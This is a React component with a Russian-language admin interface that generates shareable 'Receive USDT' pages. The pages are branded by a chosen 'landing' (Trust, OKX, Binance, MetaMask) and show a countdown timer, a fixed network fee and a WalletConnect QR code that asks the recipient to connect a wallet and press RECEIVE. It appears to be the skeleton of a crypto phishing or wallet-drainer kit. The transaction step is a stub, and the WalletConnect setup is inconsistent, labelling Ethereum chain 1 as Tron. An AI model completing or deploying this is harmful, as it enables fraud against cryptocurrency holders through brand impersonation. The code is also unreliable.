import React, { useState } from 'react';
import { 
  TextField, Button, Select, MenuItem, FormControl, 
  InputLabel, Paper, Typography, Grid, Box,
  Dialog, DialogActions, DialogContent, DialogTitle,
  IconButton
} from '@mui/material';
import ContentCopyIcon from '@mui/icons-material/ContentCopy';
import { useNavigate } from 'react-router-dom';
import { v4 as uuidv4 } from 'uuid';
import axios from 'axios';

const CreateLink = () => {
  const [amount, setAmount] = useState('');
  const [currency, setCurrency] = useState('USDT');
  const [network, setNetwork] = useState('Tron');
  const [landing, setLanding] = useState('Trust');
  const [generatedLink, setGeneratedLink] = useState('');
  const [openDialog, setOpenDialog] = useState(false);
  const navigate = useNavigate();

  const currencies = ['USDT', 'ETH', 'BTC', 'BNB'];
  const networks = ['Tron', 'Ethereum', 'BSC', 'Polygon'];
  const landings = ['Trust', 'OKX', 'Binance', 'MetaMask'];

  const generateTemplateHTML = (data) => {
    return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Receive ${data.currency}</title>
  <style>
    /* Ваши стили из шаблона */
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
    html, body { height: 100%; }
    body { background-color: #ffffff; padding: 16px; display: flex; justify-content: center; align-items: center; }
    .card { width: 100%; max-width: 520px; background: #fff; border-radius: 16px; box-shadow: 0 1px 6px rgba(0,0,0,0.05); border: 1px solid #e0e0e0; overflow: hidden; }
    .header { text-align: center; font-size: 16px; font-weight: 500; color: #1e1e1e; padding-top: 20px; }
    .amount { text-align: center; font-size: 20px; font-weight: 600; color: #002bff; margin-top: 8px; }
    .approx { text-align: center; font-size: 14px; color: #9a9a9a; margin-bottom: 16px; }
    .usdt-network { display: flex; justify-content: center; align-items: center; margin-top: 16px; gap: 8px; }
    .usdt-network img { max-height: 24px; width: auto; }
    .usdt-network .text { display: flex; align-items: center; font-size: 16px; gap: 8px; }
    .usdt-network .usdt { font-weight: 600; color: #1e1e1e; }
    .usdt-network .tron { background-color: #f2f2f7; color: #6c6c70; font-size: 14px; padding: 2px 8px; border-radius: 3px; font-weight: 300; }
    .qr { display: flex; justify-content: center; margin: 16px 0; }
    .qr img { width: 180px; height: 180px; border-radius: 12px; }
    .timer { background-color: #f2f2f7; color: #333; font-size: 14px; font-weight: 500; display: flex; justify-content: space-between; align-items: center; padding: 10px 16px; margin: 0 24px 16px; border-radius: 8px; }
    .spinner { width: 16px; height: 16px; border: 2px solid #555; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 8px; }
    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
    .details { padding: 0 24px; font-size: 14px; color: #333; }
    .detail-row { display: flex; justify-content: space-between; margin-bottom: 12px; gap: 10px; }
    .detail-row.sender { margin-top: 8px; }
    .label { color: #8e8e93; white-space: nowrap; }
    .value { font-weight: 600; color: #1c1c1e; text-align: right; overflow-wrap: break-word; word-break: break-all; flex-shrink: 1; }
    .btn-wrapper { padding: 0 24px 20px; display: none; }
    .btn { width: 100%; padding: 14px; background-color: #002bff; border: none; border-radius: 999px; color: #fff; font-weight: 600; font-size: 15px; cursor: pointer; }
    .restart-block { text-align: center; padding: 16px 24px 0; display: none; margin-bottom: 20px; }
    .restart-block p { color: #ff3b30; font-size: 14px; margin-bottom: 12px; }
    .restart-block button { width: 100%; background-color: #ff3b30; color: #fff; border: none; border-radius: 999px; padding: 14px; font-weight: 600; font-size: 14px; cursor: pointer; }
  </style>
</head>
<body>
  <div class="card">
    <div class="header">Receive ${data.currency}</div>
    <div class="amount">+${data.amount} ${data.currency}</div>
    <div class="approx">≈ ${data.usdAmount} $</div>

    <div class="usdt-network">
      <img src="https://static.tildacdn.com/tild6434-3666-4665-b762-653139336362/2025-04-02_084547.jpg" alt="${data.currency} Logo">
      <div class="text">
        <span class="usdt">${data.currency}</span>
        <span class="tron">${data.network}</span>
      </div>
    </div>

    <div class="qr">
      <div id="wallet-connect-qr"></div>
    </div>
    <div class="timer">
      <div style="display: flex; align-items: center;">
        <div class="spinner"></div>
        Awaiting receive...
      </div>
      <div id="countdown">10:00</div>
    </div>
    <div class="restart-block">
      <p>Waiting time has expired</p>
      <button id="restart-btn">Refresh receive</button>
    </div>
    <div class="details">
      <div class="detail-row">
        <div class="label">Date</div>
        <div class="value">${new Date().toISOString().split('T')[0]}</div>
      </div>
      <div class="detail-row">
        <div class="label">Status</div>
        <div class="value">Pending...</div>
      </div>
      <div class="detail-row sender">
        <div class="label">Sender address</div>
        <div class="value" id="sender-address">Not connected</div>
      </div>
      <div class="detail-row">
        <div class="label">Network Fee</div>
        <div class="value">35 TRX</div>
      </div>
    </div>
    <div class="btn-wrapper">
      <button class="btn" id="receive-btn">RECEIVE</button>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
  <script>
    // Инициализация WalletConnect для Tron
    const TOTAL_TIME = 10 * 60;
    const TIMER_KEY = '${data.currency.toLowerCase()}_timer_start';
    let walletConnectProvider;

    function initWalletConnect() {
      walletConnectProvider = new WalletConnectProvider.default({
        rpc: {
          1: "https://api.trongrid.io", // Для Tron используем TronGrid
        },
        chainId: 1, // Для Tron
      });

      walletConnectProvider.on("connect", (error, payload) => {
        if (error) {
          console.error(error);
          return;
        }
        
        const { accounts } = payload.params[0];
        document.getElementById('sender-address').textContent = 
          accounts[0].substring(0, 6) + '...' + accounts[0].substring(accounts[0].length - 4);
        
        // Активируем кнопку RECEIVE
        document.querySelector('.btn-wrapper').style.display = 'block';
      });

      walletConnectProvider.on("disconnect", (code, reason) => {
        console.log("WalletConnect disconnected", code, reason);
        document.getElementById('sender-address').textContent = 'Not connected';
        document.querySelector('.btn-wrapper').style.display = 'none';
      });

      // Отображаем QR-код
      walletConnectProvider.enable().then(() => {
        const qrElement = document.getElementById('wallet-connect-qr');
        walletConnectProvider.connector.on("display_uri", (err, payload) => {
          const uri = payload.params[0];
          new QRCode(qrElement, {
            text: uri,
            width: 180,
            height: 180,
          });
        });
      });

      // Обработка нажатия кнопки RECEIVE
      document.getElementById('receive-btn').addEventListener('click', async () => {
        try {
          // Здесь будет логика обработки транзакции
          alert('Transaction processing...');
        } catch (error) {
          console.error('Transaction error:', error);
        }
      });
    }

    // Таймер (из вашего шаблона)
    function getRemainingTime() {
      const now = Math.floor(Date.now() / 1000);
      const startTime = parseInt(localStorage.getItem(TIMER_KEY), 10);
      if (!startTime) return TOTAL_TIME;
      const elapsed = now - startTime;
      return Math.max(TOTAL_TIME - elapsed, 0);
    }

    function formatTime(seconds) {
      const m = Math.floor(seconds / 60).toString().padStart(2, '0');
      const s = (seconds % 60).toString().padStart(2, '0');
      return \`\${m}:\${s}\`;
    }

    let timerInterval;

    function showReceiveButton(show) {
      document.querySelector('.btn-wrapper').style.display = show ? 'block' : 'none';
    }

    function showExpiredBlock() {
      document.querySelector('.timer').style.display = 'none';
      document.querySelector('.restart-block').style.display = 'block';
      showReceiveButton(false);
    }

    function startTimer() {
      let timeLeft = getRemainingTime();
      const countdown = document.getElementById('countdown');

      document.querySelector('.restart-block').style.display = 'none';
      document.querySelector('.timer').style.display = 'flex';
      showReceiveButton(true);

      countdown.textContent = formatTime(timeLeft);

      clearInterval(timerInterval);
      timerInterval = setInterval(() => {
        timeLeft = getRemainingTime();
        countdown.textContent = formatTime(timeLeft);

        if (timeLeft <= 0) {
          clearInterval(timerInterval);
          showExpiredBlock();
        }
      }, 1000);
    }

    document.addEventListener('DOMContentLoaded', () => {
      initWalletConnect();
      
      const startTime = localStorage.getItem(TIMER_KEY);
      const remaining = getRemainingTime();

      if (startTime && remaining > 0) {
        startTimer();
      } else if (startTime && remaining <= 0) {
        showExpiredBlock();
      } else {
        localStorage.setItem(TIMER_KEY, Math.floor(Date.now() / 1000));
        startTimer();
      }

      document.getElementById('restart-btn').addEventListener('click', () => {
        localStorage.setItem(TIMER_KEY, Math.floor(Date.now() / 1000));
        startTimer();
      });
    });
  </script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
</body>
</html>
    `;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // Получаем текущий курс для отображения в долларах
    let usdAmount = 0;
    try {
      const response = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=tether&vs_currencies=usd`);
      usdAmount = (response.data.tether.usd * parseFloat(amount)).toFixed(2);
    } catch (error) {
      console.error('Error fetching exchange rate:', error);
      usdAmount = 'N/A';
    }

    // Генерируем уникальный ID для ссылки
    const linkId = uuidv4();
    
    // Создаем данные для шаблона
    const templateData = {
      amount,
      currency,
      network,
      landing,
      usdAmount,
      linkId
    };

    // Генерируем HTML
    const htmlContent = generateTemplateHTML(templateData);
    
    // В реальном приложении здесь бы сохраняли HTML на сервере
    // Для демонстрации создаем data URL
    const blob = new Blob([htmlContent], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    
    // Сохраняем ссылку в состоянии
    setGeneratedLink(url);
    setOpenDialog(true);

    // В реальном приложении здесь бы отправляли данные на бэкенд
    console.log('Link created with data:', templateData);
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(generatedLink);
  };

  const handleCloseDialog = () => {
    setOpenDialog(false);
    navigate('/');
  };

  return (
    <Paper elevation={3} style={{ padding: '20px', maxWidth: '600px', margin: '0 auto' }}>
      <Typography variant="h5" gutterBottom style={{ marginBottom: '30px' }}>Создать новую ссылку</Typography>
      
      <form onSubmit={handleSubmit}>
        <Grid container spacing={3}>
          <Grid item xs={12}>
            <TextField
              label="Сумма"
              variant="outlined"
              fullWidth
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              required
              type="number"
              inputProps={{ step: "0.01" }}
            />
          </Grid>
          
          <Grid item xs={12}>
            <FormControl fullWidth>
              <InputLabel>Валюта</InputLabel>
              <Select
                value={currency}
                onChange={(e) => setCurrency(e.target.value)}
                label="Валюта"
                required
              >
                {currencies.map((curr) => (
                  <MenuItem key={curr} value={curr}>{curr}</MenuItem>
                ))}
              </Select>
            </FormControl>
            <Typography variant="caption" color="textSecondary">
              {currency === 'USDT' ? (
                <span>Текущий курс: 1 {currency} ≈ $1.00</span>
              ) : (
                <span>Загрузка курса...</span>
              )}
            </Typography>
          </Grid>
          
          <Grid item xs={12}>
            <FormControl fullWidth>
              <InputLabel>Сеть</InputLabel>
              <Select
                value={network}
                onChange={(e) => setNetwork(e.target.value)}
                label="Сеть"
                required
              >
                {networks.map((net) => (
                  <MenuItem key={net} value={net}>{net}</MenuItem>
                ))}
              </Select>
            </FormControl>
          </Grid>
          
          <Grid item xs={12}>
            <FormControl fullWidth>
              <InputLabel>Лендинг</InputLabel>
              <Select
                value={landing}
                onChange={(e) => setLanding(e.target.value)}
                label="Лендинг"
                required
              >
                {landings.map((land) => (
                  <MenuItem key={land} value={land}>{land}</MenuItem>
                ))}
              </Select>
            </FormControl>
          </Grid>
          
          <Grid item xs={12}>
            <Button type="submit" variant="contained" color="primary" fullWidth size="large">
              Создать ссылку
            </Button>
          </Grid>
        </Grid>
      </form>

      {/* Диалог с созданной ссылкой */}
      <Dialog open={openDialog} onClose={handleCloseDialog}>
        <DialogTitle>Ссылка создана</DialogTitle>
        <DialogContent>
          <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
            <TextField
              value={generatedLink}
              fullWidth
              variant="outlined"
              size="small"
              InputProps={{
                readOnly: true,
              }}
            />
            <IconButton onClick={copyToClipboard} color="primary">
              <ContentCopyIcon />
            </IconButton>
          </Box>
          <Typography variant="body2" sx={{ mt: 2 }}>
            Отправьте эту ссылку получателю. При открытии ссылки будет запущен WalletConnect для сети Tron.
          </Typography>
        </DialogContent>
        <DialogActions>
          <Button onClick={handleCloseDialog}>Закрыть</Button>
          <Button 
            onClick={() => window.open(generatedLink, '_blank')}
            variant="contained"
            color="primary"
          >
            Открыть ссылку
          </Button>
        </DialogActions>
      </Dialog>
    </Paper>
  );
};

export default CreateLink;